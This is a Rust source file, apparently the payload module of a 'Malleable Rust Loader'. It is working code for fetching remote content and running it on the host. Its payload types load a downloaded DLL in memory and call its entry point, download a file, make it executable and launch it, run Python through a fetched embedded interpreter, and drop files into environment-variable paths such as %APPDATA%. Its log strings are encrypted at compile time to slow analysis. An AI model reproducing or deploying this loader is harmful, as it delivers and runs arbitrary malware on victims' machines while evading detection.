#[cfg(target_os = "windows")]
use std::os::raw::c_int;
#[cfg(target_os = "windows")]
type DllEntryPoint = extern "C" fn() -> c_int;
#[cfg(target_os = "windows")]
use std::mem;

#[cfg(target_os = "linux")]
use std::os::unix::fs::PermissionsExt;
use serde::{Deserialize, Serialize};

use rand::Rng;
use std::fs;
use std::io::Cursor;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use std::{thread, time};

#[cfg(target_os = "windows")]
use crate::embedder;

use log::debug;
use log::error;
use log::info;

use std::io::stdout;
use std::io::Write;

use crate::link::{Link, LinkFetch};

use cryptify::encrypt_string;

use anyhow::Result;

//TODO remove the () and Empty
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Payload {
    DllFromMemory(DllFromMemory),
    DownloadAndExec(DownloadAndExec),
    ExecPython(ExecPython),
    Banner(),
    Empty(Empty),
    DownloadFile(WriteFile),
}
impl Payload {
    pub fn exec_payload(&self) {
        //TODO return all data
        let exec_result = match &self {
            Payload::DllFromMemory(payload) => payload.dll_from_memory(),
            Payload::DownloadAndExec(payload) => payload.download_and_exec(),
            Payload::ExecPython(payload) => payload.deploy_embedder(),
            Payload::Banner() => Ok(banner()),
            Payload::Empty(payload) => Ok(payload.void()),
            Payload::DownloadFile(payload) => payload.download_file(),
        };
        match exec_result {
            Ok(_) => {}
            Err(e) => error!("{}{}", encrypt_string!("exec error: "), e),
        }
    }
    pub fn print_payload(&self) {
        debug!("{:#?}", self);
    }
    pub fn print_payload_compact(&self) {
        debug!("+{:?}", self);
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DllFromMemory {
    pub link: Link,
    pub dll_entrypoint: String,
}

impl DllFromMemory {
    #[cfg(target_os = "linux")]
    pub fn dll_from_memory(&self) -> Result<(), anyhow::Error> {
        error!("Its linux, impossible to run this payload: dll_from_memory");
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn dll_from_memory(&self) -> Result<(), anyhow::Error> {
        let data: Vec<u8> = self.link.fetch_data()?;
        let mydll: &[u8] = &data;

        info!("{}", encrypt_string!("Map DLL in memory"));
        let mm = memorymodule_rs::MemoryModule::new(mydll);

        info!(
            "{}{}",
            encrypt_string!("Retreive DLL entrypoint: "),
            &self.dll_entrypoint
        );
        let dll_entry_point =
            unsafe { mem::transmute::<_, DllEntryPoint>(mm.get_function(&self.dll_entrypoint)) };
        info!("{}", encrypt_string!("dll_entry_point()"));

        let result = dll_entry_point();
        debug!("{}{}", encrypt_string!("DLL result = "), result);
        //TODO quand on part d'ici, il y a un probleme
        info!("{}", encrypt_string!("-> TODO repair unsafe"));
        Ok(())
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DownloadAndExec {
    pub link: Link,
    pub out_filepath: String,
    pub out_overwrite: bool,
    pub exec_cmdline: String,
}
impl DownloadAndExec {
    pub fn download_and_exec(&self) -> Result<(), anyhow::Error> {
        let body: Vec<u8> = self.link.fetch_data()?;

        let data_write_path = self.write_file(body)?;
        self.set_permission(&data_write_path);
        debug!("{}{}", encrypt_string!("exec: "), &data_write_path);
        self.exec_file(data_write_path)
        //https://doc.rust-lang.org/std/process/struct.Command.html
    }
    // https://doc.rust-lang.org/std/process/struct.Command.html
    pub fn exec_file(&self, data_write_path: String) -> Result<(), anyhow::Error> {
        let mut comm = Command::new(&data_write_path);

        for i in self.exec_cmdline.trim().split_whitespace() {
            comm.arg(i);
        }
        //   .args(["/C", "echo hello"])
        let output = comm
            .output()
            .expect(&encrypt_string!("failed to execute process"));
        let _hello = output.stdout;
        Ok(())
    }
    pub fn write_file(&self, body: Vec<u8>) -> Result<String, anyhow::Error> {
        let data_write_path = self.calculate_out_path();
        debug!("{}{}", encrypt_string!("out_filepath: "), data_write_path);
        let mut file = std::fs::File::create(&data_write_path)?;
        let mut content = Cursor::new(body);
        std::io::copy(&mut content, &mut file)?;
        //TODO ici avec le random
        Ok(data_write_path)
    }

    #[cfg(target_os = "linux")]
    pub fn set_permission(&self, data_write_path: &String) {
        if cfg!(target_os = "linux") {
            debug!("{}{}", encrypt_string!("setpermision: : "), data_write_path);
            std::fs::set_permissions(data_write_path, std::fs::Permissions::from_mode(0o777))
                .unwrap();
        };
    }

    #[cfg(target_os = "windows")]
    pub fn set_permission(&self, _data_write_path: &String) {}

    //TODO check if the path/path exist and create the directory if needed
    //TODO prio4: use this to remove the .exe at the end and replace it
    pub fn calculate_out_path(&self) -> String {
        let mut out_filepath = String::from(&self.out_filepath);

        if out_filepath == String::from("") {
            out_filepath = basename(&self.link.get_target());
        }
        if self.out_overwrite == false {
            out_filepath = match fs::metadata(&out_filepath) {
                Ok(_) => {
                    debug!(
                        "{}{}{}",
                        encrypt_string!("File exist: "),
                        &out_filepath,
                        encrypt_string!(", out_overwrite=false -> randomize out_filepath")
                    );
                    if cfg!(target_os = "windows") {
                        format!("{}-{}.exe", &out_filepath, random_string())
                    } else {
                        format!("{}-{}", &out_filepath, random_string())
                    }
                }
                Err(_) => {
                    debug!("{}{}", encrypt_string!("-File dont exist: "), &out_filepath);
                    out_filepath
                }
            };
        }
        out_filepath
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ExecPython {
    pub link: Link,
    pub out_filepath: String,
    pub out_overwrite: bool,
    pub python_code: String,
}
impl ExecPython {
    #[cfg(target_os = "linux")]
    pub fn deploy_embedder(&self) -> Result<(), anyhow::Error> {
        error!(
            "{}",
            encrypt_string!("!Its linux, impossible to run this payload: deploy_embedder")
        );
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn deploy_embedder(&self) -> Result<(), anyhow::Error> {
        let _ = self.download_and_unzip_python();
        info!(
            "{}{}\n",
            encrypt_string!("execute python with Embedder: "),
            &self.python_code
        );
        embedder::embedder(&self.out_filepath, &self.python_code);
        Ok(())
    }

    pub fn download_and_unzip_python(&self) -> Result<(), anyhow::Error> {
        info!("{}", encrypt_string!("download_and_unzip_python"));
        let archive: Vec<u8> = self.link.fetch_data()?;
        let target_dir = PathBuf::from(&self.out_filepath); // Doesn't need to exist

        match zip_extract::extract(Cursor::new(archive), &target_dir, true) {
            Ok(_) => {}
            Err(error) => {
                error!(
                    "{}{}",
                    encrypt_string!("error to unzip python lib: "),
                    error
                )
            }
        }
        Ok(())
    }
}

pub fn banner() {
    let banner: &str = r#"
                                 ╓╖
                         , ▒╗,  ▒▒▒▒╖   ╓▒▒
  Malleable                ░░▒▒▒╖▒▒▒▒╣╣╖▒▒▒┐
 ┬─┐┬ ┬┌─┐┌┬┐        ▒▒@▒╓▒░░░░░░▒▒▒▒▒▒▒▒▒╢▓╖╓╓╖H┐
 ├┬┘│ │└─┐ │          ▒░░░░▒``▒░░░░░▒▒▒▒▒▒╢▒╢╢▒▒░`
 ┴└─└─┘└─┘ ┴   ,╓╓╓╥           ░░░░░░░▒▒▒▒▒▒▒▒▒╢╢
   LOADER      `  ▒`               ░░░░▒▒▒▒▒▒▒╢╢▒╣▒ÑH╗
                          ,▄       ░░░▒▒▒▒▒▒▒╢▒▒▒╢▒▒▒╜
               ╓╖       ╓  ██     ░▓``██▒▒▒▒▒▒▒╢▒╢╣╣
                │       █████▌   ░▐█,▄███▒▒░░▒▒▒▒╢╢╢@╖
                ╙▒      └███▀     └█████▌Ñ░░░▒▒▒▒╢╢╣▒▒░╣
                 .¿          ▄▄▄▄▄▄░"▀▀ `░░░▒▒╫╣╢╢╢╢╣╣╓▒▒
                     :``  ,, ╙████▀   ,  ░╫╬Ñ╜▒▒▒▒▒╣╢╫@▒╙▓╖
               ,░      ▒╢╫╢╢▓▒╜H   ░  ╨╨╜╙╙░  '▒▒╢▒▒▒╢▒╣▓▒▓▓╖
                  ▒ ░  ▒╙╢╢╢╢▓,               ` ░▒▒╢▒▒▒╢▒▓░╙╢N
               └╜▒▒@@  '░▒╢╣╢╢╣@,           ╓░▒ ▒░▒▒╢▒▒╣▒╢╣ ╙╙▒
                      ╙ ▒░▒╢╢╣╢▓╢╗              ▒╙░░▒╢▒╢╜╨╢▒
                        ╙▒░▒╢▒╣╣╣╨          ░ `  ░▒░║╣╢╜   `
                          "╨▒╜╢╢Ñ                  ░▒╜
                                                 ``a "#;

    info!("{}", encrypt_string!("BANNER"));
    let sleep_time = time::Duration::from_millis(3);
    for c in banner.chars() {
        print!("{}", c);
        let _ = stdout().flush();
        thread::sleep(sleep_time);
    }
    println!("");
    let sleep_time = time::Duration::from_millis(3000);
    thread::sleep(sleep_time);
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Empty {}
impl Empty {
    pub fn void(&self) {}
}

fn random_string() -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                            abcdefghijklmnopqrstuvwxyz\
                            0123456789";
    const PASSWORD_LEN: usize = 30;
    let mut rng = rand::thread_rng();

    let out_str: String = (0..PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect();
    out_str
}

pub fn basename(out_filepath: &String) -> String {
    let path = Path::new(out_filepath);
    let filename = path.file_name().unwrap();
    filename.to_str().unwrap().to_string()
}





#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WriteFile {
    pub link: Link,
    pub out_filepath: String,
    //pub out_overwrite: bool,
    //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
}
use std::fs::File;
//use std::io::Write;
use std::fs::create_dir_all;
//use std::path::Path;
use shellexpand;

impl WriteFile {
    pub fn download_file(&self) -> Result<(), anyhow::Error> {
        let body: Vec<u8> = self.link.fetch_data()?;
        //let data_write_path = self.write_file(body)?;
        //TODO calculate the PATH, create
        let path_with_env = &self.out_filepath;
        let expanded = shellexpand::env(path_with_env)?; // Expands %APPDATA% or any other environment variable       
        let path = Path::new(&*expanded); // Convert to a Path
        println!("Expanded Path: {:?}", path);

        match path.parent() {
            Some(parent_dir) => {
                if fs::metadata(parent_dir).is_ok() == false{
                    info!("[+] path not exist, create: {:?}",parent_dir);
                    create_dir_all(parent_dir)?;
                }
            },
            None =>     error!(
                "{}{:?}",
                encrypt_string!("error, impossible to retreive parent path: "),
                path
            )
        
        };

        let mut f = File::create(path)?;
        info!("[+] Write file: {:?}",path);
        f.write_all(&body)?;
        Ok(())
    }


}


